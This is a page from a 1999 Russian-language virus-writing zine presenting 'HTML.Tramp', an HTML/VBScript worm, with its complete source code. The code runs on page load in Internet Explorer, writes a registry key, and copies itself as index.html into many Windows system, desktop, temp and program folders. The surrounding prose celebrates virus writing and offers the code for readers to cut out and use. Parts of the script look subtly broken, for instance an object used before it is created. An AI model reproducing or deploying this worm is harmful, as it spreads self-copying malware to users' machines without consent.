- [Duke's Virus Labs #6] - [Page 14] -

HTML.Tramp
(c) by Duke/SMF

Имя вируса    : HTML.Tramp
Автор         : Duke/SMF
Язык прогр.   : Visual Basic 5
Платформа     : Internet Explorer 4
Дата создания : 20.04.99

   Вот дошла очередь и до HTML-вирусов. Пишутся они на Visual Basic (так и
хочется сказать Virusal Basic ;-)) и работают только под IE4 и старше. Под
Netscape'ом ну никааак не попрут - Netscape глупый и не понимает наших
VB скриптов (потому как VB - детище Microsoft'а). Зато Java понимают все.
Поэтому в начале каждого HTML-вируса на VB должна стоять проверка типа
броузера, которая пишется на Яве (такой стандартненький скриптик). Ну а
дальше - все что душа пожелает и рука возьмет. Только не стоит забывать
про стандарты VB. (Лучше всего почитать VB SDK. Тот, кто сможет его достать,
может считать себя счастливым человеком :)).

   Вирусок этот очень простой, потому что это мой первый HTML-вирус :)
Он написан только для того, чтобы показать читателю очередной тип
компьютерных вирусов. Вирусы заняли еще одну нишу - HTML файлы - и не
собираются ее покидать. Данный вирус - обыкновенный файловый червь, который
копирует себя под именем index.html в директории из своего списка.

   Хочу сказать большое СПАСИБО foxz/NVT за beta тестирование этого вируса.


===== Cut here =====
<META NAME="Author" CONTENT="Duke/SMF">
<html><body>

<SCRIPT language=JavaScript>
<!--
var userAgent=navigator.appName;
var userVer=navigator.appVersion;
var agentInfo=userAgent.substring(0, 1);
var agentVer=userVer.substring(0, 1);
if (agentInfo == "M"){
   if (agentVer >="4"){
   alert("Open this page NOW !")
   }
}else {
alert("Please use IE4 for open this page !")
self.close()
history.go(-1)
}
//-->
</SCRIPT>

<SCRIPT language=VBScript>
<!-- HTML.Tramp by Duke/SMF -->
<!-- Not run on Netscape -->
<!--
Sub window_onLoad()
On Error Resume Next
Set WsShell = CreateObject("WScript.Shell")
WsShell.RegWrite "HKEY_LOCAL_MACHINE\SMF\HTML\Name", "Tramp"
Call TrampTramp("Temp")
Call TrampTramp("My Documents")
Call TrampTramp("Windows\Desktop")
Call TrampTramp("Windows\Web")
Call TrampTramp("Windows\Help")
Call TrampTramp("Windows\Temp")
Call TrampTramp("Windows\System")
Call TrampTramp("Windows")
Call TrampTramp("Winnt\Desktop")
Call TrampTramp("Winnt\Help")
Call TrampTramp("Winnt\Temp")
Call TrampTramp("Winnt\System")
Call TrampTramp("Winnt")
Call TrampTramp("Program Files\Internet Explorer")
End Sub

Sub TrampTramp(Dir)
On Error Resume Next
if FileSystemObject.FolderExists(Dir) then
Set FSO = CreateObject("Scripting.FileSystemObject")
Set tramp = FSO.CreateTextFile("C:\" + Dir + "\index.html", True)
Set Around = document.body.createTextRange
    tramp.Write("<META NAME=" + Chr(34) + "Author" + Chr(34) + " CONTENT=" + Chr(34) + "Duke/SMF" + Chr(34)+ ">" + Chr(13) + Chr(10))
    tramp.Write("<html><body>" + Chr(13) + Chr(10))
    tramp.WriteLine Around.htmlText
    tramp.Write("<body><html>"+ Chr(13) + Chr(10) + "Hello people !" + Chr(13) + Chr(10) + "</body></html>")
    tramp.Write(FileContents)
    tramp.Close()
End If
End Sub
</SCRIPT>
<body><html>
Hello people !
</body></html>
===== Cut here =====
